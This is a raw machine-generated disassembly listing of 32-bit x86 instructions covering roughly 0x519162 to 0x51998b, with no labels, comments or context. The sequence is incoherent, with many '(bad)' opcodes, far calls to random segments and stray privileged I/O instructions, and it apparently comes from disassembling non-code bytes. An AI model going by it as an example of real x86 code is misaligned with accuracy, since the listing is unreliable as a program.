  519162:	mov    edi,DWORD PTR [ecx+0xd]
  519165:	inc    edx
  519166:	cdq    
  519167:	pop    esi
  519168:	xor    eax,0xff1a4190
  51916d:	call   0x130f:0xd8eecf0b
  519174:	aad    0x5c
  519176:	dec    edx
  519177:	jmp    0x519131
  519179:	sub    eax,0xb518792b
  51917e:	pop    eax
  51917f:	sti    
  519180:	dec    esi
  519181:	jae    0x51917c
  519183:	and    DWORD PTR [edx+edi*8],0xffffff8c
  519187:	jp     0x519136
  519189:	test   BYTE PTR [edx],ch
  51918b:	jo     0x519119
  51918d:	add    esp,eax
  51918f:	stos   DWORD PTR es:[edi],eax
  519190:	cdq    
  519191:	push   esp
  519192:	js     0x51913a
  519194:	mov    ds:0xc3c12e37,al
  519199:	jne    0x519197
  51919b:	and    esp,DWORD PTR ds:0xbdca6e75
  5191a1:	pop    ebp
  5191a2:	cdq    
  5191a3:	fs xchg edi,eax
  5191a5:	fcomp  QWORD PTR [ecx-0xdb89359]
  5191ab:	mov    ds:0xee1488c1,eax
  5191b0:	mov    edi,0x973cc1a7
  5191b5:	call   0xb60a:0x9123f11c
  5191bc:	imul   eax,DWORD PTR [edx-0x856b106],0xffffffd1
  5191c3:	(bad)  
  5191c4:	dec    esp
  5191c5:	jo     0x51914e
  5191c7:	xchg   esp,eax
  5191c8:	fwait
  5191c9:	adc    DWORD PTR [eax],ebp
  5191cb:	imul   edi,DWORD PTR [ecx-0x471f8dad],0x79dbc68c
  5191d5:	inc    ebx
  5191d6:	adc    ebx,DWORD PTR [ebp-0x5e706801]
  5191dc:	mov    esi,0x29b01f61
  5191e1:	arpl   WORD PTR [esi+0x4478a45b],ax
  5191e7:	mov    esp,edx
  5191e9:	ja     0x519176
  5191eb:	popf   
  5191ec:	fild   QWORD PTR [edx-0x79ce5fe3]
  5191f2:	in     al,0x7c
  5191f4:	mov    edi,0x296c1982
  5191f9:	inc    ebx
  5191fa:	dec    eax
  5191fb:	inc    ecx
  5191fc:	sub    al,0xfc
  5191fe:	mov    dl,0xba
  519200:	xchg   edx,eax
  519201:	xchg   esp,eax
  519202:	sbb    BYTE PTR [ecx-0x6d4a444a],0x41
  519209:	sbb    al,BYTE PTR [eax-0x77008ee9]
  51920f:	xor    bh,BYTE PTR [edi+0x25]
  519212:	xor    eax,0x13c4b1fb
  519217:	inc    edi
  519218:	cmp    bl,ch
  51921a:	push   0xffffffd5
  51921c:	xchg   ecx,eax
  51921d:	mov    bh,0x25
  51921f:	leave  
  519220:	mov    esp,0xdfad664f
  519225:	dec    edi
  519226:	xchg   esi,eax
  519227:	sbb    al,0x0
  519229:	xchg   dh,bh
  51922b:	xchg   DWORD PTR [ecx-0x67e7e812],edi
  519231:	jp     0x51923d
  519233:	pop    eax
  519234:	push   0xc02d471b
  519239:	call   0xf77dade0
  51923e:	fsubrp st(3),st
  519240:	stos   DWORD PTR es:[edi],eax
  519241:	cwde   
  519242:	inc    eax
  519243:	out    0xd5,al
  519245:	jbe    0x5191e3
  519247:	jnp    0x5191d2
  519249:	int    0xa4
  51924b:	dec    ecx
  51924c:	cdq    
  51924d:	loopne 0x5192ab
  51924f:	xlat   BYTE PTR ds:[ebx]
  519250:	(bad)  
  519252:	fmul   DWORD PTR [edi+edx*4]
  519255:	push   eax
  519256:	sub    eax,DWORD PTR [bp+di+0x194a]
  51925b:	jmp    0x30f3:0x101687f
  519262:	inc    esp
  519263:	jns    0x5192bd
  519265:	iret   
  519266:	pop    ecx
  519268:	or     al,0x98
  51926a:	popf   
  51926b:	push   ss
  51926c:	retf   0xde19
  51926f:	das    
  519270:	sub    DWORD PTR [ecx+ebx*1],ebx
  519273:	mov    ebx,0xe4b0b95c
  519278:	mov    edx,0x8b7911a3
  51927d:	fild   QWORD PTR [eax]
  51927f:	adc    eax,eax
  519281:	push   edi
  519282:	dec    esp
  519283:	inc    ebx
  519284:	inc    ecx
  519285:	adc    edi,ebx
  519287:	fldenv [ecx+eax*4-0x6]
  51928b:	sbb    eax,0x6de11817
  519290:	rcr    DWORD PTR [ebx-0x56],0xfd
  519294:	loop   0x5192ab
  519296:	adc    esp,ecx
  519298:	mov    al,ds:0x78d19b88
  51929d:	xor    eax,0x4960b9a
  5192a2:	mov    ecx,0xfdcb2928
  5192a7:	or     eax,eax
  5192a9:	pop    ss
  5192aa:	add    BYTE PTR [ebx-0x59],0x4d
  5192ae:	ins    BYTE PTR es:[edi],dx
  5192af:	(bad)  [ebx+0x72903bbd]
  5192b5:	cmp    ebp,DWORD PTR [esp+eiz*4]
  5192b8:	cmp    ecx,DWORD PTR [edi-0x10]
  5192bb:	jecxz  0x519337
  5192bd:	sbb    ch,BYTE PTR [eax+0x70]
  5192c0:	inc    edx
  5192c1:	ret    
  5192c2:	in     eax,0xb
  5192c4:	out    0x35,eax
  5192c6:	add    al,ch
  5192c8:	sub    DWORD PTR [ecx-0x68],ebp
  5192cb:	pop    ebp
  5192cc:	xlat   BYTE PTR cs:[ebx]
  5192ce:	push   ebp
  5192cf:	call   0xefe06c8f
  5192d4:	mov    DWORD PTR [esi-0x4a3ef930],esp
  5192da:	neg    BYTE PTR [ecx+0x12e07a7c]
  5192e0:	dec    esp
  5192e1:	mov    ch,0x9e
  5192e3:	adc    ah,BYTE PTR [edi]
  5192e5:	dec    ebp
  5192e6:	adc    esi,esp
  5192e8:	push   es
  5192e9:	pop    edi
  5192ea:	adc    DWORD PTR [ecx],esi
  5192ec:	mov    ah,0x4c
  5192ee:	call   0xbef0d101
  5192f3:	mov    esi,0x53b1a8e2
  5192f8:	aas    
  5192f9:	lods   al,BYTE PTR ds:[esi]
  5192fa:	stos   DWORD PTR es:[edi],eax
  5192fb:	adc    al,0x98
  5192fd:	sbb    eax,DWORD PTR [esi+0x48]
  519300:	jge    0x519283
  519302:	cli    
  519303:	mov    dl,0x17
  519305:	in     al,0xb4
  519307:	int3   
  519308:	hlt    
  519309:	xchg   ebx,eax
  51930a:	imul   ebp,DWORD PTR [ebx],0xf15b6cc4
  519310:	mov    ecx,0xa43c6129
  519315:	add    ch,ch
  519317:	outs   dx,DWORD PTR ds:[esi]
  519318:	leave  
  519319:	out    0xc4,al
  51931b:	mov    edx,0x9cd9f916
  519320:	repz xchg ebp,eax
  519322:	xchg   ebx,eax
  519323:	cdq    
  519324:	imul   ecx,DWORD PTR [edx-0x7caa6cd8],0xffffff98
  51932b:	xor    DWORD PTR [ebx+0x605c03d8],eax
  519331:	std    
  519332:	sbb    eax,0x565a67de
  519337:	test   BYTE PTR [edi-0x153eb98c],dh
  51933d:	jp     0x5192fc
  51933f:	cwde   
  519340:	in     al,0x17
  519342:	stc    
  519343:	cs jno 0x519354
  519346:	arpl   cx,bx
  519348:	lds    edx,FWORD PTR [edx-0x3c]
  51934b:	sbb    eax,0x3f9b545c
  519350:	dec    esp
  519351:	out    0x9,al
  519353:	into   
  519354:	push   esp
  519355:	xlat   BYTE PTR ds:[ebx]
  519356:	push   edx
  519357:	adc    eax,0x51bf6acd
  51935c:	ss jmp 0x60c5:0x32cf0603
  519364:	js     0x5193c3
  519366:	cmp    ah,dh
  519368:	adc    BYTE PTR [esi+edx*1-0x10f89f5f],0x34
  519370:	lods   al,BYTE PTR ds:[esi]
  519371:	add    BYTE PTR [eax+esi*1],0x61
  519375:	push   edx
  519376:	call   0x8b01:0x8af97eba
  51937d:	mov    DWORD PTR [esi],0xa6dce4dd
  519383:	retf   
  519384:	push   ecx
  519385:	xchg   edi,eax
  519386:	xor    ebx,DWORD PTR [edi+0xe]
  519389:	stc    
  51938a:	push   edi
  51938b:	in     al,dx
  51938c:	xchg   esp,eax
  51938d:	loop   0x5193e9
  51938f:	ja     0x519362
  519391:	daa    
  519392:	enter  0x6e5a,0x4a
  519396:	out    dx,eax
  519397:	push   eax
  519398:	cmp    BYTE PTR [ecx],ch
  51939a:	inc    ecx
  51939b:	fisttp DWORD PTR ds:0xad964200
  5193a1:	cmp    edi,DWORD PTR [eax+ebp*4-0x4d]
  5193a5:	xchg   edx,eax
  5193a6:	mov    cl,0xcc
  5193a8:	addr16 mov al,0x86
  5193ab:	dec    edx
  5193ac:	jmp    0x5b8f:0xf0afef2a
  5193b3:	in     eax,dx
  5193b4:	pop    ebp
  5193b5:	add    eax,0xdb3726f7
  5193ba:	enter  0x9850,0xa5
  5193be:	shl    BYTE PTR [eax+0x3869a402],1
  5193c4:	out    0x47,eax
  5193c6:	mov    edi,0x1e1f6fc8
  5193cb:	mov    eax,ds:0x53080cbf
  5193d0:	fldcw  WORD PTR ds:0xe084d40
  5193d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5193d7:	arpl   ax,dx
  5193d9:	aaa    
  5193da:	jae    0x51939e
  5193dc:	xchg   ebx,ebp
  5193de:	das    
  5193df:	jl     0x5193eb
  5193e1:	fisttp QWORD PTR [ebx]
  5193e3:	call   0xdb0180b1
  5193e8:	je     0x5193b4
  5193ea:	iret   
  5193eb:	popa   
  5193ec:	call   0x4633:0xdd98cb14
  5193f3:	sahf   
  5193f4:	iret   
  5193f5:	mov    ebx,DWORD PTR [ebx-0x5a84e84]
  5193fb:	mov    ah,0xe4
  5193fd:	(bad)  
  5193fe:	shr    BYTE PTR [ecx],cl
  519400:	xchg   edi,eax
  519401:	lahf   
  519402:	cmc    
  519403:	jo     0x519451
  519405:	data16 lods al,BYTE PTR ds:[esi]
  519407:	out    0x4e,eax
  519409:	add    bl,bh
  51940b:	add    al,dl
  51940d:	(bad)  
  51940e:	push   ecx
  51940f:	pop    ds
  519410:	sub    esp,DWORD PTR [ebp-0x1332a440]
  519416:	dec    ecx
  519417:	push   ebx
  519418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  519419:	and    eax,0x3a936f25
  51941e:	dec    edi
  51941f:	jae    0x51946d
  519421:	push   esi
  519422:	sbb    eax,0xd243e86d
  519427:	imul   eax,DWORD PTR [edi+ecx*4-0x65bf4b39],0xffffffa7
  51942f:	sub    eax,0xeec5851b
  519434:	test   eax,0xa566f1aa
  519439:	repz push 0xc0273981
  51943f:	push   ebp
  519440:	imul   edi,DWORD PTR [esi-0x2c],0x40c90d35
  519447:	fidivr DWORD PTR [eax-0x4b]
  51944a:	inc    esi
  51944b:	cld    
  51944c:	loope  0x5193f8
  51944e:	or     eax,0x1b5947e4
  519453:	clc    
  519454:	cmp    DWORD PTR [ecx+0x508dd641],esi
  51945a:	inc    eax
  51945b:	push   esp
  51945c:	out    dx,eax
  51945d:	ror    bh,0x4c
  519460:	aam    0x40
  519462:	(bad)  
  519463:	ds fcmovb st,st(3)
  519466:	(bad)  
  519467:	retf   
  519468:	mov    cl,0x73
  51946a:	fucomp st(7)
  51946c:	nop
  51946d:	imul   ebx,DWORD PTR [eax+ebp*1-0x44],0x77b53d2c
  519475:	hlt    
  519476:	add    esp,DWORD PTR [ebx+0x6d]
  519479:	loop   0x51940d
  51947b:	clc    
  51947c:	imul   ebx,DWORD PTR [edx],0x35
  51947f:	inc    edx
  519480:	push   es
  519481:	xor    DWORD PTR [eax+0x73],esp
  519484:	or     ecx,DWORD PTR [ebx-0x34]
  519487:	xchg   edi,eax
  519488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  519489:	xor    ah,BYTE PTR [ebp+0x459db391]
  51948f:	mov    ecx,0x3dac4a14
  519494:	mov    ch,0x79
  519496:	add    eax,0x243cafaa
  51949b:	xor    esi,DWORD PTR [edx]
  51949d:	xlat   BYTE PTR ds:[ebx]
  51949e:	pop    eax
  51949f:	ss pop ds
  5194a1:	pop    DWORD PTR [ebx]
  5194a3:	jle    0x51943b
  5194a5:	repz pop eax
  5194a7:	das    
  5194a8:	addr16 dec edx
  5194aa:	or     BYTE PTR [edi-0x1c],dl
  5194ad:	ret    
  5194ae:	fwait
  5194af:	sahf   
  5194b0:	mov    ebx,0x6492402d
  5194b5:	sub    DWORD PTR [eax-0x3a],ecx
  5194b8:	(bad)  
  5194b9:	fdivr  DWORD PTR [ecx-0x57]
  5194bc:	in     eax,0x41
  5194be:	push   edi
  5194bf:	ins    DWORD PTR es:[edi],dx
  5194c0:	out    0x6a,al
  5194c2:	ds rcl ch,0x68
  5194c6:	call   ecx
  5194c8:	adc    dl,BYTE PTR [esi]
  5194ca:	xchg   BYTE PTR [ebx-0x5d],ah
  5194cd:	push   eax
  5194ce:	ins    BYTE PTR es:[edi],dx
  5194cf:	adc    ebp,DWORD PTR [ebx+0x1eaa8a38]
  5194d5:	jo     0x5194c7
  5194d7:	mov    esp,esi
  5194d9:	dec    ebp
  5194da:	xchg   esp,eax
  5194db:	sbb    BYTE PTR [edx],al
  5194dd:	fst    DWORD PTR [ecx+0x594f9a57]
  5194e3:	std    
  5194e4:	push   edx
  5194e5:	mov    eax,ds:0x4ec90a4a
  5194ea:	or     DWORD PTR ds:0x6a37f5c7,esp
  5194f0:	push   eax
  5194f1:	mov    WORD PTR [edi],ds
  5194f3:	nop
  5194f4:	scas   al,BYTE PTR es:[edi]
  5194f5:	and    ah,BYTE PTR [ecx-0x20375152]
  5194fb:	enter  0x4699,0xec
  5194ff:	mov    ah,BYTE PTR [esi-0x1c]
  519502:	(bad)  
  519504:	and    eax,0xaea211e3
  519509:	lock fcom QWORD PTR [edi-0x48]
  51950d:	loopne 0x519548
  51950f:	fld    DWORD PTR [edi+0x58]
  519512:	jbe    0x519584
  519514:	jl     0x519567
  519516:	(bad)  
  519517:	(bad)
  51951b:	stos   DWORD PTR es:[edi],eax
  51951c:	pop    edi
  51951d:	cmp    BYTE PTR [ebp+0x839c886],dh
  519523:	or     BYTE PTR [ecx+0x3f],0xda
  519527:	mov    edx,ebx
  519529:	(bad)  
  51952a:	xchg   edi,eax
  51952b:	push   edx
  51952c:	xchg   edx,eax
  51952d:	pop    eax
  51952e:	inc    esp
  51952f:	sub    BYTE PTR [edi],cl
  519531:	out    dx,al
  519532:	in     eax,0x73
  519534:	mov    al,ds:0xd9e2754c
  519539:	sahf   
  51953a:	repz xchg edx,eax
  51953c:	mov    ch,0x1b
  51953e:	stc    
  51953f:	pop    ebx
  519540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  519541:	xchg   ecx,eax
  519542:	dec    eax
  519543:	jnp    0x5194ee
  519545:	dec    eax
  519546:	hlt    
  519547:	in     al,dx
  519548:	and    edi,edx
  51954a:	int    0x4e
  51954c:	push   edx
  51954d:	adc    cl,ch
  51954f:	push   edi
  519550:	cmc    
  519551:	xor    cl,BYTE PTR [ebx]
  519553:	lods   al,BYTE PTR ds:[esi]
  519554:	rol    DWORD PTR [ebx+0x47],0x1d
  519558:	aaa    
  519559:	lea    ecx,[ecx]
  51955b:	mov    ebx,0x6be851c2
  519560:	loopne 0x5195a6
  519562:	dec    eax
  519563:	out    0xd1,eax
  519565:	fcom   QWORD PTR [ecx+0x81a1bd2]
  51956b:	push   edx
  51956c:	mov    ebp,0x7d563600
  519571:	jne    0x5195d2
  519573:	mov    esi,0x210ce450
  519578:	add    BYTE PTR [ecx-0x6b30ef26],0x7f
  51957f:	jo     0x5195c1
  519581:	add    BYTE PTR [edx-0x71],bl
  519584:	lock or DWORD PTR [esi+esi*2],0x6a
  519589:	out    0xdf,eax
  51958b:	add    BYTE PTR [edi+0x8],ah
  51958e:	mov    ds:0xa0998829,eax
  519593:	jecxz  0x519515
  519595:	and    ebp,DWORD PTR [esi-0x6e726b2c]
  51959b:	or     bh,dl
  51959d:	xor    bl,al
  51959f:	push   ds
  5195a0:	cli    
  5195a1:	js     0x51956a
  5195a3:	retf   
  5195a4:	jle    0x5195fb
  5195a6:	jns    0x5195a0
  5195a8:	mov    ds:0x88af20b6,eax
  5195ad:	outs   dx,DWORD PTR ds:[esi]
  5195ae:	outs   dx,DWORD PTR ds:[esi]
  5195af:	(bad)  
  5195b0:	cmp    bh,dh
  5195b2:	mov    al,ds:0x8ef1c772
  5195b7:	pop    esi
  5195b8:	inc    esi
  5195b9:	mov    bl,0x3c
  5195bb:	(bad)  
  5195bc:	int    0xf7
  5195be:	inc    edx
  5195bf:	pop    esi
  5195c0:	pop    es
  5195c1:	mov    ebp,0x5faf1269
  5195c6:	xchg   ecx,eax
  5195c7:	xchg   DWORD PTR [eax+0xb001973],edx
  5195cd:	mov    ds:0x9504dbec,al
  5195d2:	dec    BYTE PTR [edx*8-0x656a5c99]
  5195d9:	or     eax,0x492e5914
  5195de:	inc    edx
  5195df:	push   edx
  5195e0:	mov    ebp,0xb9e5e07
  5195e5:	imul   edi,edx,0x5d
  5195e8:	sbb    edx,DWORD PTR [edi+0x2d0bdfc2]
  5195ee:	stos   BYTE PTR es:[edi],al
  5195ef:	xchg   esi,eax
  5195f0:	add    DWORD PTR [edx],ebp
  5195f2:	arpl   cx,bx
  5195f4:	or     bh,BYTE PTR [edx-0x4878e96b]
  5195fa:	cmp    DWORD PTR [esi],edi
  5195fc:	stos   BYTE PTR es:[edi],al
  5195fd:	add    BYTE PTR [eax-0x285fb7c2],ch
  519603:	jg     0x519592
  519605:	stc    
  519606:	shr    esi,cl
  519608:	out    dx,eax
  519609:	dec    ebp
  51960a:	adc    eax,0x14f54b2
  51960f:	jnp    0x5195dc
  519611:	adc    eax,0x538304f9
  519616:	dec    edx
  519617:	hlt    
  519618:	or     DWORD PTR [edi-0x65],0x74daa0a6
  51961f:	cmp    eax,0x82b8dc0
  519624:	in     al,0xc8
  519626:	xor    al,0x39
  519628:	push   ebp
  519629:	xchg   edx,eax
  51962a:	test   eax,0xb5d068e2
  51962f:	test   DWORD PTR [edi],ebx
  519631:	fimul  DWORD PTR ds:0x3d80e1e6
  519637:	or     DWORD PTR [ecx+0x74f8a718],ecx
  51963d:	daa    
  51963e:	add    DWORD PTR [esi-0x7a],esp
  519641:	bound  esp,QWORD PTR [eax]
  519643:	and    eax,0x622bc41a
  519648:	(bad)
  51964c:	(bad)  
  51964d:	cmp    al,0xa9
  51964f:	xchg   ebx,eax
  519650:	std    
  519651:	push   0xffffffbb
  519653:	jno    0x519662
  519655:	fcom   DWORD PTR [esi+0xe]
  519658:	push   0xffffffe0
  51965a:	sub    bh,BYTE PTR [esi-0x190d7cbb]
  519660:	test   BYTE PTR [ecx-0x53],dl
  519663:	dec    ebp
  519664:	cmp    DWORD PTR [eax-0x3b],esp
  519667:	mov    ecx,0x5fa66b4a
  51966c:	or     esi,DWORD PTR [edx]
  51966e:	dec    ebp
  51966f:	cmp    ah,cl
  519671:	sti    
  519672:	int    0xa2
  519674:	dec    edi
  519675:	add    eax,0xcc028b43
  51967a:	push   esi
  51967b:	aad    0xdb
  51967d:	jno    0x5196fd
  51967f:	jmp    0x5196c4
  519681:	sub    ah,bh
  519683:	imul   eax,DWORD PTR [ecx+0x15],0xffffffd9
  519687:	xor    esp,DWORD PTR [ebx]
  519689:	mov    edi,0x3f868ab6
  51968e:	imul   ebp,esp,0xfffffffc
  519691:	xchg   edi,eax
  519692:	scas   eax,DWORD PTR es:[edi]
  519693:	out    0xd8,eax
  519695:	iret   
  519696:	sub    dl,cl
  519698:	jg     0x51970a
  51969a:	add    ebp,DWORD PTR [edx+0x5cfe63b1]
  5196a0:	jge    0x519664
  5196a2:	push   ss
  5196a3:	push   eax
  5196a4:	mov    DWORD PTR [ecx],esi
  5196a6:	shl    DWORD PTR [eax-0x56],1
  5196a9:	xchg   esi,eax
  5196aa:	xor    eax,0x967edef5
  5196af:	inc    BYTE PTR [edi*4+0x58649a90]
  5196b6:	fimul  WORD PTR [eax]
  5196b8:	out    0xd4,eax
  5196ba:	(bad)
  5196bd:	jecxz  0x5196f7
  5196bf:	in     al,0xdf
  5196c1:	lods   al,BYTE PTR ds:[esi]
  5196c2:	fld    QWORD PTR [ecx-0x1]
  5196c5:	scas   eax,DWORD PTR es:[edi]
  5196c6:	cmp    al,0xc1
  5196c8:	fucom  st(0)
  5196ca:	out    dx,al
  5196cb:	jg     0x5196e7
  5196cd:	stos   DWORD PTR es:[edi],eax
  5196ce:	cmp    BYTE PTR [ecx],bl
  5196d0:	jge    0x51966b
  5196d2:	je     0x51967b
  5196d4:	fisttp WORD PTR [edx+0x52]
  5196d7:	add    DWORD PTR [edx+0x21],esp
  5196da:	push   ebp
  5196db:	retf   
  5196dc:	out    dx,al
  5196dd:	clc    
  5196de:	sub    al,0xbb
  5196e0:	cmp    eax,0xabe506fd
  5196e5:	out    dx,eax
  5196e6:	test   al,0xe8
  5196e8:	mov    eax,0x2eb6ed43
  5196ed:	and    edx,DWORD PTR [ecx-0x65645dcf]
  5196f3:	sub    BYTE PTR [edi],dh
  5196f5:	xchg   ebx,eax
  5196f6:	sbb    DWORD PTR [ebx],esp
  5196f8:	cmp    DWORD PTR [ecx+0x4e],esi
  5196fb:	ror    DWORD PTR [edx+0x6168e2ff],1
  519701:	jns    0x519721
  519703:	add    ecx,eax
  519705:	or     dh,al
  519707:	inc    ebx
  519708:	adc    BYTE PTR [ebx+0x3d091650],dl
  51970e:	push   ebp
  51970f:	(bad)  
  519710:	std    
  519711:	sbb    ah,BYTE PTR [eax]
  519713:	or     eax,0x99e5a184
  519718:	shl    BYTE PTR [edx-0x556728b2],1
  51971e:	lock jmp 0xf03f:0xc279cac
  519726:	adc    ebp,0xffffffcf
  519729:	jge    0x51977e
  51972b:	rcr    dl,cl
  51972d:	xor    al,BYTE PTR ds:0x409a5374
  519733:	and    dl,BYTE PTR [ebp+0x1e7090]
  519739:	sbb    al,0xe7
  51973b:	push   ebx
  51973c:	not    cl
  51973e:	mov    BYTE PTR [ecx-0x7b7c9ca6],0x4
  519745:	out    0xa8,al
  519747:	aam    0xbe
  519749:	inc    ebx
  51974a:	cld    
  51974b:	icebp  
  51974c:	adc    eax,0xe14420e5
  519751:	stos   BYTE PTR es:[edi],al
  519752:	dec    ebx
  519753:	jno    0x519762
  519755:	(bad)  
  519756:	sti    
  519757:	aaa    
  519758:	loope  0x5196df
  51975a:	test   eax,0x13fd327f
  51975f:	(bad)  
  519760:	cdq    
  519761:	mov    bl,0x6e
  519763:	fiadd  DWORD PTR [edi+0x4f]
  519766:	xchg   esi,eax
  519767:	stc    
  519768:	pop    ecx
  519769:	and    BYTE PTR [edx],dh
  51976b:	cmc    
  51976c:	and    BYTE PTR [edi],dh
  51976e:	sub    eax,0x433a3ef6
  519773:	xchg   esp,eax
  519774:	xchg   esi,eax
  519775:	sub    DWORD PTR [ecx+0x18],eax
  519778:	scas   al,BYTE PTR es:[edi]
  519779:	bound  ebx,QWORD PTR [eax-0x5504b713]
  51977f:	mov    edi,0xa1093918
  519784:	mov    eax,0x2d279077
  519789:	cmp    BYTE PTR [eax],dl
  51978b:	mov    esp,0x998a522e
  519790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  519791:	and    eax,0x8c4d9e4e
  519796:	ret    0xa87d
  519799:	pop    ds
  51979a:	ins    BYTE PTR es:[edi],dx
  51979b:	retf   
  51979c:	ret    0x2648
  51979f:	inc    esp
  5197a0:	sub    eax,0xb0055fdf
  5197a5:	ja     0x51977d
  5197a7:	loopne 0x51975d
  5197a9:	or     BYTE PTR [eax+0x12],ch
  5197ac:	or     al,0xe1
  5197ae:	fs dec ecx
  5197b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5197b1:	jns    0x51977b
  5197b3:	enter  0xb3fa,0x44
  5197b7:	add    DWORD PTR [esi+0x62174083],ebp
  5197bd:	inc    ecx
  5197be:	pusha  
  5197bf:	mov    al,ds:0x9dfdd00b
  5197c4:	adc    esp,DWORD PTR [ecx-0x103cf5fd]
  5197ca:	pop    ss
  5197cb:	(bad)  
  5197cc:	push   eax
  5197cd:	cmp    eax,0xb93a6ba4
  5197d2:	xor    BYTE PTR [esi-0x63147710],ah
  5197d8:	xchg   DWORD PTR [ebx+0x61],edx
  5197db:	jo     0x51977f
  5197dd:	test   BYTE PTR [edx+0x52c4bbb],al
  5197e3:	add    bl,BYTE PTR [ecx+0x416332c5]
  5197e9:	das    
  5197ea:	test   DWORD PTR [edx],0xf84fd869
  5197f0:	xchg   esi,eax
  5197f1:	jge    0x5197c9
  5197f3:	xchg   edi,eax
  5197f4:	pusha  
  5197f5:	or     DWORD PTR ds:0x4934eee4,edx
  5197fb:	sar    DWORD PTR [edx+0x31],cl
  5197fe:	sti    
  5197ff:	not    edi
  519801:	or     ah,BYTE PTR fs:[edx+0x22]
  519805:	mov    ds:0x48f4c711,eax
  51980a:	sti    
  51980b:	fsubr  st(1),st
  51980d:	cmp    al,0x28
  51980f:	add    al,0x4b
  519811:	jle    0x5197ed
  519813:	mov    WORD PTR [ecx+0x4f52a6f9],gs
  519819:	add    eax,0xc6192e76
  51981e:	ja     0x519805
  519820:	sti    
  519821:	fisttp QWORD PTR [ebx-0x79]
  519824:	stc    
  519825:	inc    edi
  519826:	out    0x88,al
  519828:	jge    0x5198a5
  51982a:	mov    ebx,0x787bbb5a
  51982f:	fwait
  519830:	loop   0x5197ed
  519832:	mov    ah,0xb8
  519834:	jge    0x519822
  519836:	or     BYTE PTR [edi+0x1775b0a3],bh
  51983c:	nop
  51983d:	dec    esp
  51983e:	inc    esi
  51983f:	fs mov esp,0x949e1ee1
  519845:	lea    esp,[eax+ebx*2-0x57]
  519849:	mov    es,WORD PTR [edi]
  51984b:	sbb    al,0xd9
  51984d:	mov    ebx,0x30264060
  519852:	dec    ecx
  519853:	imul   ebx,DWORD PTR [edi-0x1a],0x13
  519857:	ins    BYTE PTR es:[edi],dx
  519858:	out    0xa7,eax
  51985a:	mov    bh,0x5b
  51985c:	pop    es
  51985d:	pop    ds
  51985e:	loop   0x5197f4
  519860:	xor    DWORD PTR [edx-0x50b5c5fd],eax
  519866:	mov    ebp,0x94590e6f
  51986b:	xor    bl,ah
  51986d:	arpl   dx,sp
  51986f:	pop    edx
  519870:	imul   DWORD PTR [ecx]
  519872:	or     BYTE PTR [edx+0x65],dl
  519875:	or     eax,0xd1c3f9ac
  51987a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51987b:	imul   ecx,DWORD PTR [eax-0x29],0x39
  51987f:	(bad)  
  519881:	jle    0x519809
  519883:	in     al,dx
  519884:	inc    esi
  519885:	rcl    ecx,1
  519887:	push   0xffffff8a
  519889:	mov    bh,0xf7
  51988b:	repz int3 
  51988d:	mov    dl,0xf5
  51988f:	je     0x51985f
  519891:	call   0x72f8019e
  519896:	and    dl,bl
  519898:	(bad)  
  519899:	xchg   edx,eax
  51989a:	push   esp
  51989b:	data16 mov dl,0x44
  51989e:	aas    
  51989f:	xor    eax,0x79e5dcd3
  5198a4:	push   0x2
  5198a6:	and    al,0xab
  5198a8:	push   edi
  5198a9:	jae    0x519864
  5198ab:	cmp    BYTE PTR [ecx+0x775386b5],dl
  5198b1:	cmp    cl,BYTE PTR [edi-0x7aa0205c]
  5198b7:	mov    ebx,0x5061918c
  5198bc:	add    BYTE PTR [edi],0xa7
  5198bf:	or     dl,BYTE PTR [ebx]
  5198c1:	out    0x38,al
  5198c3:	pusha  
  5198c4:	out    dx,al
  5198c5:	sub    eax,0xdca9b896
  5198ca:	jl     0x5198f3
  5198cc:	inc    ecx
  5198cd:	mov    ch,0xf8
  5198cf:	test   BYTE PTR [edi+0xc5ccaa3],al
  5198d5:	fnsave [eax-0x16bf75db]
  5198db:	cmp    eax,0x566ea026
  5198e0:	mov    edx,0x7c4537b
  5198e5:	icebp  
  5198e6:	aas    
  5198e7:	out    0x97,al
  5198e9:	sub    al,0x4d
  5198eb:	xchg   ebx,eax
  5198ec:	call   0x934a:0xa782f196
  5198f3:	mov    bl,0x30
  5198f5:	mov    ebp,0x15c639d9
  5198fa:	pop    es
  5198fb:	stos   BYTE PTR es:[edi],al
  5198fc:	ja     0x51995f
  5198fe:	xor    al,0x9f
  519900:	sub    BYTE PTR [ecx+edi*8-0x311b3574],al
  519907:	mov    dl,0xe0
  519909:	adc    ebp,DWORD PTR [ecx+ebx*1+0x1e235468]
  519910:	cmp    cl,dl
  519912:	pop    ebx
  519913:	icebp  
  519914:	mov    fs,WORD PTR [ebx+esi*8+0x13]
  519918:	pop    esp
  519919:	nop
  51991a:	pusha  
  51991b:	sahf   
  51991c:	stos   BYTE PTR es:[edi],al
  51991d:	in     al,0xad
  51991f:	xchg   DWORD PTR [ebx-0x29],ebx
  519922:	shl    DWORD PTR [ebp-0x24],1
  519925:	stc    
  519926:	mov    bl,0x69
  519928:	mov    ebp,0x9889767b
  51992d:	mov    ecx,0xf4f6168a
  519932:	out    0x58,al
  519934:	mov    gs,WORD PTR [edx-0x65]
  519937:	xchg   ebp,eax
  519938:	cli    
  519939:	cdq    
  51993a:	xor    esi,DWORD PTR [ecx+ebp*2-0xd]
  51993e:	out    dx,al
  51993f:	mov    al,ds:0xa8584c77
  519944:	fdivr  DWORD PTR [edi+0x545de6d8]
  51994a:	aam    0xad
  51994c:	xchg   esi,eax
  51994d:	xchg   DWORD PTR [edx],ebp
  51994f:	leave  
  519950:	iret   
  519951:	mov    esp,0x2e469175
  519956:	fnsave [esi-0x2ef5b8d7]
  51995c:	(bad)  
  51995e:	dec    ecx
  51995f:	(bad)  
  519960:	mov    ds:0xc45b4571,eax
  519965:	cs ins DWORD PTR es:[edi],dx
  519967:	add    BYTE PTR [ebx],ah
  519969:	outs   dx,DWORD PTR es:[esi]
  51996b:	not    cl
  51996d:	xchg   edi,eax
  51996e:	in     eax,0x90
  519970:	jnp    0x5199d4
  519972:	dec    esp
  519973:	adc    DWORD PTR [ecx],edx
  519975:	mov    eax,gs:0x1c4239b3
  51997b:	or     DWORD PTR [esp+eax*1],ecx
  51997e:	aam    0x14
  519980:	or     DWORD PTR [edx+edi*2-0x80],esi
  519984:	(bad)  
  519985:	shl    BYTE PTR ds:0x40915566,cl
  51998b:	push   eax
